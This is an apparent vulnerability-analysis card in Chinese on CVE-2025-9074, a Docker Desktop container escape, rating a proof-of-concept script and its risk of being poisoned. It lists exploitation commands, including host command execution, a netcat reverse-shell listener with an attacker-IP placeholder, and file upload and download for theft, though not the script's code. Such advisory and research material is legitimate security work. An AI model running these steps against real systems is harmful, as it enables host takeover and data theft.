## CVE-2025-9074 - Docker Desktop 容器逃逸/越权访问

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸/越权访问

**影响应用:** Docker Desktop

**危害等级:** 高危

**CVSS评分:** 9.3

**影响版本:** 所有低于4.44.3版本的Docker Desktop (Windows和macOS)

**利用条件:** 本地运行的恶意Linux容器，无需身份验证(从容器内部)，不依赖挂载Docker socket

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

POC有效性分析:
The Python script CVE-2025-9074-docker-exploit.py 提供了一个高度有效且全面的概念验证，用于利用 CVE-2025-9074，这是一个影响 Windows 和 macOS 上 Docker Desktop 的关键容器逃逸漏洞。该漏洞允许在本地运行的恶意 Linux 容器绕过隔离机制，通过预配置的内部默认子网（http://192.168.65.7:2375）直接访问 Docker Engine API，而无需挂载 Docker socket 或从容器的角度进行任何身份验证。该 POC 展示了从侦察（列出主机容器）到完全主机入侵的全套攻击能力。它包含用于在任何目标容器内或直接在主机上执行任意命令、建立持久反向 Shell 会话以及促进双向文件传输的功能。该脚本使用标准的 Python 库（如 requests、argparse、os、threading）精心编写，并具有强大的设计元素，如依赖检查和错误处理。值得注意的是，它结合了平台特定的逻辑，例如针对 Windows Docker Desktop 环境的 normalize_host_path 函数，增强了其实际适用性。该 POC 明确证实 CVE-2025-9074 确实可能导致从看似隔离的容器环境对主机系统进行完全入侵，从而凸显了其对安全研究人员和渗透测试人员的严重性。

利用步骤:
使用此 POC 利用 CVE-2025-9074 需要攻击者首先获得在 Windows 或 macOS 上运行未修补的 Docker Desktop（版本低于 4.44.3）的系统上的 Linux 容器内执行代码的能力。
1.  前置条件：确保在恶意容器内安装了 Python 的 docker 库和 websocket-client（例如，通过 pip install docker websocket-client）。
2.  部署 POC：将 CVE-2025-9074-docker-exploit.py 脚本放置到恶意容器内（例如，通过 wget 或挂载卷）。
3.  目标 Docker Engine API：脚本默认瞄准 http://192.168.65.7:2375，这是易受攻击的内部子网端点。
4.  侦察（可选）：列出主机容器：python CVE-2025-9074-docker-exploit.py list_containers。
5.  主机命令执行：使用 python CVE-2025-9074-docker-exploit.py exec_shell -h -C "whoami" 直接在主机上执行命令。这会利用临时特权容器与主机进行交互。
6.  反向 Shell：建立完全交互式控制。在攻击者机器上设置一个监听器（例如，nc -lvnp 4444）。然后，从容器内执行：python CVE-2025-9074-docker-exploit.py reverse_shell -L <攻击者IP> -P <攻击者端口>。这将为主机提供一个高权限的 Shell。
7.  文件操作：执行数据窃取或持久化。从容器上传文件到主机：python CVE-2025-9074-docker-exploit.py upload_file -S /path/in/container -D /path/on/host。从主机下载文件：python CVE-2025-9074-docker-exploit.py download_file -S /path/on/host -D /path/in/container。
8.  清理：利用后，使用脚本的 cleanup 函数清除任何临时工件。
这些步骤概述了一个全面的攻击链，从容器访问升级到完全主机入侵，突显了 CVE-2025-9074 的严重影响。

投毒风险分析:
根据对所提供的 Python POC 代码 (CVE-2025-9074-docker-exploit.py) 进行的全面审查，评估结果显示其投毒风险为**低**（0-29%）。此评估基于对其结构、依赖关系和功能的深入分析。
首先，该脚本完全使用**标准的、有充分文档记录的 Python 库**，例如 `requests`、`sys`、`json`、`argparse`、`os`、`signal`、`socket`、`platform`、`threading` 和 `time`。不存在晦涩或不受信任的第三方依赖，这显著降低了通过第三方或模糊依赖嵌入隐藏恶意功能的可能性。
其次，代码**未经过混淆，清晰且结构合理**。描述性的变量名、定义明确的函数（例如 `get_containers`、`execute_command`、`reverse_shell`）以及相关的注释增强了透明度，使审计人员能够直接理解其预期行为并验证不存在隐蔽的恶意负载。
第三，POC 中所有观察到的网络活动都**与漏洞利用过程直接相关**。主要网络目标是硬编码的 Docker Engine API 端点 `http://192.168.65.7:2375`，这是该漏洞的核心。没有迹象表明存在对未知外部 C2 服务器的未经授权连接或异常的数据外泄尝试。反向 Shell 功能连接到由用户通过命令行参数（`-L`、`-P`）明确提供的 IP 地址和端口，而不是脚本中硬编码的恶意命令和控制服务器。
最后，脚本执行的操作——例如用于命令执行的容器创建、Docker API 交互和文件系统操作——都**与合法的漏洞利用演示一致**。这些操作本身构成了漏洞利用的有效载荷，而不是作为隐藏的恶意软件嵌入在 POC 工具中。
综上所述，`CVE-2025-9074-docker-exploit.py` 脚本似乎是一个合法的安全研究工具。其清晰的设计、标准库的使用和专注的网络活动导致了低投毒风险评估。然而，用户在执行任何漏洞利用工具之前，尤其是在生产环境中，应始终进行尽职调查。

**项目地址:** 

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-9074
